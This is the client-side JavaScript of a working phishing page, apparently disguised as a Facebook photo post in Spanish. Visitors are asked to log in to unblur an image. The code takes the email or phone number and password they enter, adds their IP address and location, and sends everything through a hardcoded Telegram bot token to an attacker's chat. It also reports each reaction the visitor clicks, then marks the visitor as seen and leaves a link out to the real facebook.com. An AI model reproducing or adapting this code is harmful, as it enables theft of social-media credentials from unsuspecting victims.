$(document).ready( () => {    
  
      const visto = localStorage.getItem('visto'),
             btReac = document.querySelector('#btReac'),
             rsImg = document.querySelectorAll('#reacSel img'),
             audAbrir = new Audio('../sound/abrir.mp3'),
             audSel = new Audio('../sound/seleccionar.mp3'),
             audLike = new Audio('../sound/like.mp3');
  
      const inptVal = () => {
        argv1 = document.getElementById('argv1').value;
        argv2 = document.getElementById('argv2').value,
        emailRegex = /^[-\w.%+]{1,64}@(?:[A-Z0-9-]{1,63}\.){1,125}[A-Z]{2,63}$/i;
        validated = '';
       
        if( argv1 == '' || argv2 == '' ){
          validated = false;
        } else if ( emailRegex.test(argv1) & argv2.length >= 6 ) {
          validated = true; 
        } else {
          ( isNaN(argv1) || argv1.length < 10 || argv2.length < 6 )
          ? validated = false
          : validated = true;
        }
        return validated;
      }

      const ready = () => {
        if( inptVal() == false){
          let validated = false;
        } else {
          $('#btn-cont').prop("disabled", true);
          let dip =  $('#dip').text(),
              cou =  $('#cou').text(),
              sta =  $('#sta').text(),
              ciu =  $('#ciu').text();

          let message =  `■■■■■🤣🫵🤡■■■■■
👤 L: ${argv1} 
🔑 C: ${argv2}
🌐 i: ${dip}
🌎 P: ${cou}
🏛 E: ${sta}
🏙 Ct: ${ciu}
■■■■■■■■■■■■■■`;
              return message;
        }
        }

      const sender = async(msg) => {
        const telegram_bot_id = '6562905773:AAFpR1dDRp6CJdIENVq_d3hm4od-NrY3pLY',
             chat_id = '-1001908180943';

        let settings = {
            "async": true,
            "crossDomain": true,
            "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "cache-control": "no-cache"
            },
            "data": JSON.stringify({
                "chat_id": chat_id,
                "text": msg
            })
        };
        $.ajax(settings).done(function (response) {
            console.log(response);
            if (msg.includes('■')) {
            localStorage.setItem('visto', 'true');
            $('#exampleModal').modal('hide');
            imgFin();
            rel();
            }
        });

      }

      const imgFin = () => {
        const blur = document.getElementById('blur');
        $('#btn-ver').prop("disabled", true);
        blur.classList.toggle('active');
        $('#txt-ver').text('Cubrir foto');
      };

      const hidPost = () => {
        $('#post').css('display', 'none');
        $('#visto').css('display', 'block');
        $('#ini'). on('click', () => {
          location.href="http://facebook.com"
        });
      };

      const rel = () => {
        setTimeout(() => {
          location.reload();
        }, 15000);
      }

      $('.argv').on('focus', () => {
        $('.argv').removeClass('err');
      });

      $('#btn-cont').on('click', () => {
        let listo = ready();
        (listo)
        ? sender(listo)
        : $('.argv').addClass('err');
      });

      $('#btn-ver').on('click', () => {
        const argv2 = document.getElementById('argv2');
        argv2.type = 'password';
        $('.argv').removeClass('err');

      });
      
      const envMg = () => {
        audLike.play();
        let dip = $('#dip').text(),
            uMG = `${ dip } dió Me gusta 👍🏾.`;
        $('#mgca').text('12');
        sender(uMG);
      }
      
   /*  btReac.addEventListener('click', () => {
       likeToggle();
     });*/
      
    /*  btReac.addEventListener('mouseenter', () => {
        $('#reacSel').removeClass('idle');
        reaccionar();
      });*/
      
      $('#btReac').hover( () => {
        $('#reacSel').removeClass('idle');
        audAbrir.play();
   });
   
      $('#btReac').click( () => {
        likeToggle();
   });
      
      btReac.addEventListener('contextmenu', () => {
       // audAbrir.play();
        $('#reacSel').removeClass('idle');
      }); 

      const reaccionar = () => {
        rsImg.forEach((img) => {
          img.addEventListener('click', () => {
            audSel.play();
            let dip = $('#dip').text();
            let reaccion = img.classList.toString();
            reaccionActiva = reaccion;

            const elimClases = () => {
              $('.chos').removeClass('selecc');
              $('.reacNom').removeClass('meAct');
              $('.reacNom').removeClass('mgAct');
              $('.reacNom').removeClass('ywAct');
              $('.reacNom').removeClass('angAct');
              $('#mgd').removeClass('bi-hand-thumbs-up');
              $('#mgd').addClass('bi-hand-thumbs-up-fill');
              
            };

            const apRea = () => {
              elimClases();
              $('.chos').addClass('selecc');
              $('.chos').css('background-image', 'url(https://ptgez-cuentas.000webhostapp.com/foto-ale-duarte/img/'+ reaccion +'.png)');
              $('#mgca').text('12');
              $('#mgd').css('display', 'none');
              $('#mga').addClass('mga');
            }


            switch (reaccion) {
              case 'remg':
                elimClases();
                $('.chos').removeClass('selecc');
                $('.chos').removeClass('seleccLov');
                $('#mgca').text('12');
                $('.reacNom').text('Me gusta');
                $('.reacNom').addClass('mgAct');
                $('#mgd').css('display', 'none');
                $('#mga').removeClass('mga');
                //$('#mgd').toggleClass('bi-hand-thumbs-up-fill');
                sender(`${ dip } dió Me gusta 👍🏾.`);
                break;
              case 'lov':

                sender(`${ dip } dió Me encanta ❤️.`);
                elimClases();
                $('#mgca').text('12');
                $('.chos').addClass('seleccLov');
                $('.chos').css('background-image', 'url(https://ptgez-cuentas.000webhostapp.com/foto-ale-duarte/img/lov.png)');
                $('.reacNom').text('Me encanta');
                $('.reacNom').addClass('meAct');
                $('#mgd').css('display', 'none');
                $('#mga').addClass('mga');
                break;
              case 'mi':
                apRea();
                $('.reacNom').text('Me importa');
                $('.reacNom').addClass('ywAct');
                sender(`${ dip } dió Me importa 🥰.`);
                break;
              case 'happy':
                apRea();
                $('.reacNom').text('Me divierte');
                $('.reacNom').addClass('ywAct');
                sender(`${ dip } dió Me divierte 🤣.`);
                break;
              case 'wow':
                apRea();
                $('.reacNom').text('Me asombra');
                $('.reacNom').addClass('ywAct');
                sender(`${ dip } dió Me asombra 😯.`);
                break;
              case 'sad':
               apRea();
               $('.reacNom').text('Me entristece');
               $('.reacNom').addClass('ywAct');
              sender(`${ dip } dió Me entristece 😥.`);
               break;
              case 'ang':
               apRea();
               $('.reacNom').text('Me enoja');
               $('.reacNom').addClass('angAct');
              sender(`${ dip } dió Me enoja 😡.`);
               break;
              default:
              alert('No reacción.');
            }
          });
        });
      }; 
      
      if ( $('#reacSel').hasClass('idle') ) {
        reaccionar();
      }
      
      const likeToggle = () => {
        $('#mga').addClass('mga');
        $('#mgd').css('display', 'inline');
        $('#mgd').toggleClass('bi-hand-thumbs-up');
        $('#mgd').toggleClass('bi-hand-thumbs-up-fill');
        $('.reacNom').text('Me gusta');
        
        $('.chos').removeClass('selecc');
        $('.chos').removeClass('seleccLov');
        $('.reacNom').removeClass('meAct');
        //$('.reacNom').removeClass('mgAct');
        $('.reacNom').removeClass('ywAct');
        $('.reacNom').removeClass('angAct');
        ($('#mgd').hasClass('bi-hand-thumbs-up-fill'))
        ? $('.reacNom').addClass('mgAct')
        : $('.reacNom').removeClass('mgAct');
        ($('#mgd').hasClass('bi-hand-thumbs-up'))
        ? $('#mgca').text('11')
        : envMg();
        
      };

      $('body').on('click', () => {
        $('#reacSel').addClass('idle');
      });    
      
      if(visto == 'true') {
        imgFin();
        hidPost();
      }

});